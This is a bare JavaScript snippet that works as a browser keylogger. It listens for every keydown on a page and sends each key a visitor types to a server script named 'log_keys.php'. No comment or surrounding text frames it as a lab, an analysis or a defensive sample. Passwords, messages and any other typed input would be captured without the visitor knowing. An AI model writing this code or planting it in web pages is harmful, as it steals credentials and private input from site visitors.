document.addEventListener('keydown', function(event) {
    var key = event.key;
    
    fetch('log_keys.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'key=' + encodeURIComponent(key)
    });
});
